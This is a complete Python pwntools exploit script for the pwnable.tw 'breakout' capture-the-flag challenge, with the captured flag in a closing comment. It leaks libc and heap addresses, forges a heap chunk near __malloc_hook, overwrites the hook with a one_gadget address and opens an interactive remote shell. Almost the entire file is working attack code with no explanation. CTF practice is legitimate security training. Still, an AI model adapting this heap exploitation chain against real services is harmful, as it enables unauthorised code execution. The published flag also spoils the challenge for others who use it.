from pwn import *

p = remote("chall.pwnable.tw", 10400)
#p = process("./breakout", env={"LD_PRELOAD":"./libc_64.so.6"})
elf = ELF("./breakout")
libc = ELF("./libc_64.so.6")

context.arch = "amd64"
context.log_level = "debug"

def list_all():
    p.sendafter(b"> ", b"list\n")

def set_note(cell:int, size:int, content):
    p.sendafter(b"> ", b"note\n")
    p.sendafter(b"Cell: ", str(cell).encode())
    p.sendafter(b"Size: ", str(size).encode())
    p.sendafter(b"Note: ", content)

def punish(cell:int):
    p.sendafter(b"> ", b"punish\n")
    p.sendafter(b"Cell: ", str(cell).encode())  

def exp():
    # leak libc
    set_note(6, 0x80, b"aaaa")
    set_note(7, 0x20, b"bbbb")
    set_note(6, 0x90, b"cccc")
    set_note(8, 0x80, b"a"*8)
    list_all()
    p.recvuntil(b"Life imprisonment, murder")
    p.recvuntil(b"aaaaaaaa")
    libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
    libc_base = libc_leak - 0x108 + 0xa0 - libc.symbols["__malloc_hook"]
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    fake_chunk = malloc_hook - 0x23
    one_list = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
    print("[*] libc_leak:", hex(libc_leak))
    print("[*] libc_base:", hex(libc_base))
    print("[*] malloc_hook:", hex(malloc_hook))
    print("[*] fake_chunk:", hex(fake_chunk))

    #gdb.attach(p)

    # leak heap
    remote_offset = 0x410 #remote-0x410  local-0x0
    punish(1)
    set_note(9, 0x48, p64(malloc_hook+0x68)*2)
    list_all()
    p.recvuntil(b"multiple homicides")
    p.recvuntil(b"Prisoner: ")
    heap_leak = u64((b""+p.recv(6)).ljust(8, b"\x00"))
    heap_base = heap_leak - 0x2169a0 + remote_offset
    print("[*] heap_leak:", hex(heap_leak))
    print("[*] heap_base:", hex(heap_base))

    # realloc attach
    ## link to fake_chunk
    set_note(2, 0x68, b"aaaa") #target_chunk
    set_note(3, 0x20, b"split")
    set_note(2, 0x78, b"bbbb")
    target_chunk = heap_base + 0x2169a0 - remote_offset
    print("[*] target_chunk:", hex(target_chunk))
    payload = p64(heap_base)*3+p64(0x000000010000002d)+p64(heap_base)+p64(0x10)+p64(target_chunk+0x10)
    set_note(9, 0x48, payload)
    set_note(1, 0x10, p64(fake_chunk))

    ## get_fakechunk
    set_note(3, 0x68, b"cccc")
    one_gadget = libc_base + one_list[3]
    set_note(4, 0x30, b"a"*(0x13-0x8)+p64(one_gadget)+p64(libc_base+0x83b1b))
    set_note(5, 0x40, b"split")
    ## write malloc_hook
    set_note(4, 0x68, b"")
    print("[*] malloc_hook:", hex(malloc_hook))
    print("[*] one_gadget:", hex(one_gadget))

    # get shell
    p.sendafter(b"> ", b"note\n")
    p.sendafter(b"Cell: ", b"0")
    p.sendafter(b"Size: ", str(0x80).encode())

    p.interactive()

if __name__ == "__main__":
    exp()


    # FLAG{Br3ak_0ut_7He_Pr1s0N}
